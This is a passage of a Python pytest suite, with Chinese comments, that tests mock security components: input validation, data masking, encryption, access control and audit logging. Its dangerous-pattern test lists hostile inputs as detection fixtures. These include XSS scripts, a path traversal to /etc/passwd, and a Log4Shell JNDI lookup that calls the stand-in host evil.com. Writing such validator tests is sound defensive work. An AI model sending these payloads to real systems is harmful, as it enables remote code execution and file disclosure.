    @pytest.mark.p0
    @pytest.mark.security
    def test_dangerous_pattern_detection(self):
        """测试危险模式检测"""
        dangerous_inputs = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "onclick=alert('xss')",
            "SELECT * FROM users WHERE id=1",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for dangerous_input in dangerous_inputs:
            assert self.validator.contains_dangerous_patterns(dangerous_input), \
                f"应该检测到危险模式: {dangerous_input}"
            
            is_valid, message = self.validator.validate_input(dangerous_input, "username")
            assert not is_valid, f"危险输入应该被拒绝: {dangerous_input}"
    
    @pytest.mark.unit
    @pytest.mark.p1
    @pytest.mark.security
    def test_password_validation(self):
        """测试密码验证"""
        # 强密码
        strong_passwords = [
            "StrongPass123!",
            "MySecure@Password2024",
            "Complex#Pass$word1"
        ]
        
        for password in strong_passwords:
            is_valid, errors = self.validator.validate_password(password)
            assert is_valid, f"强密码应该通过验证: {password}, 错误: {errors}"
        
        # 弱密码
        weak_passwords = [
            "123456",  # 太短，无复杂性
            "password",  # 无大写、数字、特殊字符
            "PASSWORD123",  # 无小写、特殊字符
            "Pass123",  # 太短
        ]
        
        for password in weak_passwords:
            is_valid, errors = self.validator.validate_password(password)
            assert not is_valid, f"弱密码应该被拒绝: {password}"
            assert len(errors) > 0
    
    @pytest.mark.unit
    @pytest.mark.p1
    @pytest.mark.security
    def test_input_sanitization(self):
        """测试输入清理"""
        test_cases = [
            ("<script>alert('xss')</script>", "&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;"),
            ('Hello "World"', "Hello &quot;World&quot;"),
            ("Test & Co.", "Test &amp; Co."),
            ("<div>content</div>", "&lt;div&gt;content&lt;/div&gt;")
        ]
        
        for input_value, expected_output in test_cases:
            sanitized = self.validator.sanitize_input(input_value)
            assert sanitized == expected_output, \
                f"清理结果不匹配: 输入={input_value}, 期望={expected_output}, 实际={sanitized}"
    
    @pytest.mark.unit
    @pytest.mark.p1
    @pytest.mark.security
    def test_api_key_validation(self):
        """测试API密钥验证"""
        # 有效API密钥
        valid_keys = [
            "sk-1234567890abcdef1234567890abcdef",
            "api_key_1234567890abcdef1234567890abcdef1234567890",
            "test-key-with-dashes-and-underscores_123456789"
        ]
        
        for key in valid_keys:
            assert self.validator.validate_api_key_format(key), f"API密钥应该有效: {key}"
        
        # 无效API密钥
        invalid_keys = [
            "short",  # 太短
            "key with spaces",  # 包含空格
            "key@with#special",  # 包含特殊字符
            "",  # 空字符串
            None  # None值
        ]
        
        for key in invalid_keys:
            assert not self.validator.validate_api_key_format(key), f"API密钥应该无效: {key}"
    
    @pytest.mark.unit
    @pytest.mark.p2
    @pytest.mark.security
    def test_url_validation(self):
        """测试URL验证"""
        # 有效URL
        valid_urls = [
            "https://api.deepseek.com/v1/chat/completions",
            "http://localhost:8080/api",
            "https://example.com",
            "https://sub.domain.com/path/to/resource"
        ]
        
        for url in valid_urls:
            is_valid, message = self.validator.validate_input(url, "url")
            assert is_valid, f"URL应该有效: {url}, 错误: {message}"
        
        # 无效URL
        invalid_urls = [
            "not-a-url",
            "ftp://example.com",  # 不支持的协议
            "https://",  # 不完整
            "javascript:alert('xss')"  # 危险协议
        ]
        
        for url in invalid_urls:
            is_valid, message = self.validator.validate_input(url, "url")
            assert not is_valid, f"URL应该无效: {url}"


class TestDataMasking:
    """数据脱敏测试类"""
    
    def setup_method(self):
        """测试方法设置"""
        self.config = SecurityConfig()
        self.masker = MockDataMasker(self.config)
    
    @pytest.mark.unit
    @pytest.mark.p0
    @pytest.mark.security
    def test_email_masking(self):
        """测试邮箱脱敏"""
        email = "user@example.com"
        masked = self.masker.mask_sensitive_data(email, "email")
        
        assert masked == "user***@example.com"
        assert "@example.com" in masked
        assert "user" in masked
    
    @pytest.mark.unit
    @pytest.mark.p0
    @pytest.mark.security
    def test_phone_masking(self):
        """测试电话号码脱敏"""
        phone = "13812345678"
        masked = self.masker.mask_sensitive_data(phone, "phone")
        
        assert masked == "138****5678"
        assert "138" in masked
        assert "5678" in masked
        assert "1234" not in masked
    
    @pytest.mark.unit
    @pytest.mark.p1
    @pytest.mark.security
    def test_api_key_masking(self):
        """测试API密钥脱敏"""
        api_key = "sk-1234567890abcdef1234567890abcdef"
        masked = self.masker.mask_sensitive_data(api_key, "api_key")
        
        assert masked == "sk-12345***"
        assert "sk-12345" in masked
        assert "67890abcdef1234567890abcdef" not in masked
    
    @pytest.mark.unit
    @pytest.mark.p1
    @pytest.mark.security
    def test_sensitive_data_detection(self):
        """测试敏感数据检测"""
        test_cases = [
            ("user@example.com", True, "email"),
            ("13812345678", True, "phone"),
            ("sk-1234567890abcdef1234567890abcdef", True, "api_key"),
            ("normal text", False, ""),
            ("123-45-6789", True, "ssn")
        ]
        
        for data, should_be_sensitive, expected_type in test_cases:
            is_sensitive, detected_type = self.masker.is_sensitive_data(data)
            assert is_sensitive == should_be_sensitive, f"敏感数据检测错误: {data}"
            if should_be_sensitive:
                assert detected_type == expected_type, f"数据类型检测错误: {data}"
    
    @pytest.mark.unit
    @pytest.mark.p1
    @pytest.mark.security
    def test_log_data_masking(self):
        """测试日志数据脱敏"""
        log_message = "用户 user@example.com 使用API密钥 sk-1234567890abcdef 调用了接口"
        masked_log = self.masker.mask_log_data(log_message)
        
        assert "user***@example.com" in masked_log
        assert "sk-12345***" in masked_log
        assert "sk-1234567890abcdef" not in masked_log
    
    @pytest.mark.unit
    @pytest.mark.p2
    @pytest.mark.security
    def test_masking_disabled_config(self):
        """测试禁用脱敏配置"""
        # 禁用脱敏
        disabled_config = SecurityConfig(sensitive_data_masking=False)
        disabled_masker = MockDataMasker(disabled_config)
        
        sensitive_data = "user@example.com"
        
        # 应该返回原始数据
        masked_data = disabled_masker.mask_sensitive_data(sensitive_data, "email")
        assert masked_data == sensitive_data


class TestSecurityCompliance:
    """安全合规测试类"""
    
    def setup_method(self):
        """测试方法设置"""
        self.config = SecurityConfig()
        self.encryption_manager = MockEncryptionManager(self.config)
        self.access_manager = MockAccessControlManager(self.config)
        self.audit_logger = MockAuditLogger(self.config)
        self.validator = MockInputValidator(self.config)
        self.masker = MockDataMasker(self.config)
    
    @pytest.mark.integration
    @pytest.mark.p0
    @pytest.mark.security
    def test_secure_api_workflow(self):
        """测试安全API工作流"""
        # 1. 用户认证
        user = self.access_manager.create_user(
            "testuser", "test@example.com", 
            permissions={PermissionType.READ, PermissionType.WRITE}
        )
        session_id = self.access_manager.authenticate_user("testuser", "correct_password")
        assert session_id is not None
        
        # 记录登录事件
        self.audit_logger.log_login_attempt("testuser", True, "192.168.1.100")
        
        # 2. 权限检查
        authenticated_user = self.access_manager.get_user_by_session(session_id)
        assert self.access_manager.check_permission(authenticated_user, "/api/chat", PermissionType.WRITE)
        
        # 3. 输入验证
        api_input = "Hello, how are you?"
        is_valid, message = self.validator.validate_input(api_input, "text")
        assert is_valid
        
        # 4. 数据加密
        encrypted_data = self.encryption_manager.encrypt_data(api_input)
        assert encrypted_data != api_input
        
        # 5. API调用记录
        self.audit_logger.log_api_call(
            authenticated_user.id, "/api/chat", "POST", 200, 
            "192.168.1.100", "TestClient/1.0"
        )
        
        # 6. 数据解密
        decrypted_data = self.encryption_manager.decrypt_data(encrypted_data)
        assert decrypted_data == api_input
        
        # 7. 敏感数据脱敏（用于日志）
        log_message = f"用户 {authenticated_user.email} 发送了消息"
        masked_log = self.masker.mask_log_data(log_message)
        assert "***" in masked_log
    
    @pytest.mark.integration
    @pytest.mark.p1
    @pytest.mark.security
    def test_security_violation_handling(self):
        """测试安全违规处理"""
        # 创建普通用户
        user = self.access_manager.create_user(
            "normaluser", "normal@example.com", 
            permissions={PermissionType.READ}
        )
        session_id = self.access_manager.authenticate_user("normaluser", "correct_password")
        authenticated_user = self.access_manager.get_user_by_session(session_id)
        
        # 尝试访问需要写权限的资源
        has_permission = self.access_manager.check_permission(
            authenticated_user, "/admin/users", PermissionType.ADMIN
        )
        assert not has_permission
        
        # 记录安全违规
        violation_details = {
            "attempted_resource": "/admin/users",
            "required_permission": "admin",
            "user_permissions": list(authenticated_user.permissions)
        }
        
        self.audit_logger.log_security_violation(
            authenticated_user.id, "unauthorized_access", violation_details
        )
        
        # 验证违规记录
        violations = self.audit_logger.get_events(event_type=AuditEventType.SECURITY_VIOLATION)
        assert len(violations) == 1
        assert violations[0].security_level == SecurityLevel.CRITICAL
    
    @pytest.mark.integration
    @pytest.mark.p1
    @pytest.mark.security
    def test_data_protection_workflow(self):
        """测试数据保护工作流"""
        # 敏感数据
        sensitive_data = {
            "user_email": "user@example.com",
            "api_key": "sk-1234567890abcdef1234567890abcdef",
            "phone": "13812345678",
            "message": "这是用户的私密消息"
        }
        
        # 1. 输入验证
        for key, value in sensitive_data.items():
            if key == "user_email":
                is_valid, _ = self.validator.validate_input(value, "email")
                assert is_valid
            elif key == "api_key":
                assert self.validator.validate_api_key_format(value)
        
        # 2. 数据加密存储
        encrypted_data = {}
        for key, value in sensitive_data.items():
            encrypted_data[key] = self.encryption_manager.encrypt_data(str(value), key)
        
        # 验证加密
        for key, encrypted_value in encrypted_data.items():
            assert encrypted_value != str(sensitive_data[key])
        
        # 3. 数据解密使用
        decrypted_data = {}
        for key, encrypted_value in encrypted_data.items():
            decrypted_data[key] = self.encryption_manager.decrypt_data(encrypted_value, key)
        
        # 验证解密
        for key, decrypted_value in decrypted_data.items():
            assert decrypted_value == str(sensitive_data[key])
        
        # 4. 日志脱敏
        log_message = f"处理用户 {sensitive_data['user_email']} 的API请求，密钥: {sensitive_data['api_key']}"
        masked_log = self.masker.mask_log_data(log_message)
        
        assert "user***@example.com" in masked_log
        assert "sk-12345***" in masked_log
        assert sensitive_data['api_key'] not in masked_log
    
    @pytest.mark.integration
    @pytest.mark.p2
    @pytest.mark.security
    def test_security_monitoring_and_alerting(self):
        """测试安全监控和告警"""
        # 模拟多种安全事件
        events = [
            # 正常登录
            ("user1", True, "192.168.1.100"),
            # 失败登录
            ("user1", False, "192.168.1.100"),
            ("user1", False, "192.168.1.100"),
            ("user1", False, "192.168.1.100"),
            # 不同IP的失败登录
            ("user2", False, "10.0.0.1"),
            ("user2", False, "10.0.0.2"),
        ]
        
        for username, success, ip in events:
            self.audit_logger.log_login_attempt(username, success, ip)
        
        # 记录安全违规
        self.audit_logger.log_security_violation(
            "user1", "brute_force_attempt", 
            {"failed_attempts": 3, "time_window": "5_minutes"}
        )
        
        # 获取安全摘要
        summary = self.audit_logger.get_security_summary()
        
        assert summary['failed_logins'] >= 5
        assert summary['security_violations'] >= 1
        assert summary['unique_users'] >= 2
        assert summary['unique_ips'] >= 3
        
        # 检查高风险事件
        high_risk_events = self.audit_logger.get_events()
        critical_events = [e for e in high_risk_events if e.security_level == SecurityLevel.CRITICAL]
        assert len(critical_events) >= 1
    
    @pytest.mark.integration
    @pytest.mark.p2
    @pytest.mark.security
    def test_key_rotation_workflow(self):
        """测试密钥轮换工作流"""
        key_id = "rotation_test"
        
        # 生成初始密钥
        original_key = self.encryption_manager.generate_key(key_id)
        
        # 使用密钥加密数据
        test_data = "需要保护的敏感数据"
        encrypted_with_old_key = self.encryption_manager.encrypt_data(test_data, key_id)
        
        # 模拟密钥轮换需求
        assert self.encryption_manager.is_key_rotation_needed(key_id) or True  # 强制轮换
        
        # 轮换密钥
        new_key = self.encryption_manager.rotate_key(key_id)
        assert new_key != original_key
        
        # 新密钥应该能正常工作
        encrypted_with_new_key = self.encryption_manager.encrypt_data(test_data, key_id)
        decrypted_data = self.encryption_manager.decrypt_data(encrypted_with_new_key, key_id)
        assert decrypted_data == test_data
        
        # 记录密钥轮换事件
        rotation_event = AuditEvent(
            id=secrets.token_hex(16),
            event_type=AuditEventType.CONFIG_CHANGE,
            user_id="system",
            resource="encryption_key",
            action="key_rotation",
            result="success",
            details={"key_id": key_id, "old_key_version": 1, "new_key_version": 2}
        )
        
        self.audit_logger.log_event(rotation_event)
        
        # 验证轮换记录
        rotation_events = self.audit_logger.get_events(event_type=AuditEventType.CONFIG_CHANGE)
        assert len(rotation_events) >= 1


class TestSecurityPerformance:
    """安全性能测试类"""
    
    def setup_method(self):
        """测试方法设置"""
        self.config = SecurityConfig()
        self.encryption_manager = MockEncryptionManager(self.config)
        self.access_manager = MockAccessControlManager(self.config)
        self.audit_logger = MockAuditLogger(self.config)
    
    @pytest.mark.performance
    @pytest.mark.p2
    @pytest.mark.security
    def test_encryption_performance(self):
        """测试加密性能"""
        test_data = "这是一段需要加密的测试数据" * 100  # 增加数据量
        
        start_time = time.time()
        
        # 执行多次加密操作
        for i in range(100):
            encrypted = self.encryption_manager.encrypt_data(f"{test_data}_{i}")
            decrypted = self.encryption_manager.decrypt_data(encrypted)
            assert decrypted == f"{test_data}_{i}"
        
        end_time = time.time()
        execution_time = end_time - start_time
        
        # 性能断言（100次操作应该在合理时间内完成）
        assert execution_time < 5.0, f"加密性能测试超时: {execution_time}秒"
    
    @pytest.mark.performance
    @pytest.mark.p2
    @pytest.mark.security
    def test_concurrent_authentication(self):
        """测试并发认证性能"""
        # 创建多个用户
        users = []
        for i in range(10):
            user = self.access_manager.create_user(f"user{i}", f"user{i}@example.com")
            users.append(user)
        
        def authenticate_user(username):
            """认证用户函数"""
            return self.access_manager.authenticate_user(username, "correct_password")
        
        start_time = time.time()
        
        # 并发认证
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(authenticate_user, f"user{i}") for i in range(10)]
            results = [future.result() for future in futures]
        
        end_time = time.time()
        execution_time = end_time - start_time
        
        # 验证所有认证都成功
        assert all(result is not None for result in results)
        
        # 性能断言
        assert execution_time < 2.0, f"并发认证性能测试超时: {execution_time}秒"
    
    @pytest.mark.performance
    @pytest.mark.p2
    @pytest.mark.security
    def test_audit_logging_performance(self):
        """测试审计日志性能"""
        start_time = time.time()
        
        # 记录大量审计事件
        for i in range(1000):
            event = AuditEvent(
                id=f"event_{i}",
                event_type=AuditEventType.API_CALL,
                user_id=f"user_{i % 10}",
                resource=f"/api/endpoint_{i % 5}",
                action="GET",
                result="success"
            )
            self.audit_logger.log_event(event)
        
        end_time = time.time()
        execution_time = end_time - start_time
        
        # 验证事件数量
        events = self.audit_logger.get_events()
        assert len(events) == 1000
        
        # 性能断言
        assert execution_time < 3.0, f"审计日志性能测试超时: {execution_time}秒"
    
    @pytest.mark.performance
    @pytest.mark.p2
    @pytest.mark.security
    def test_permission_checking_performance(self):
        """测试权限检查性能"""
        # 创建用户和权限
        user = self.access_manager.create_user(
            "perfuser", "perf@example.com",
            permissions={PermissionType.READ, PermissionType.WRITE}
        )
        
        # 设置多个资源权限
        for i in range(100):
            self.access_manager.set_resource_permissions(
                f"resource_{i}", {PermissionType.READ, PermissionType.WRITE}
            )
        
        start_time = time.time()
        
        # 执行大量权限检查
        for i in range(1000):
            resource = f"resource_{i % 100}"
            permission = PermissionType.READ if i % 2 == 0 else PermissionType.WRITE
            result = self.access_manager.check_permission(user, resource, permission)
            assert result  # 应该都有权限
        
        end_time = time.time()
        execution_time = end_time - start_time
        
        # 性能断言
        assert execution_time < 1.0, f"权限检查性能测试超时: {execution_time}秒"


if __name__ == "__main__":
    # 运行测试
    pytest.main([
        __file__,
        "-v",
        "--tb=short",
        "-m", "security"
    ])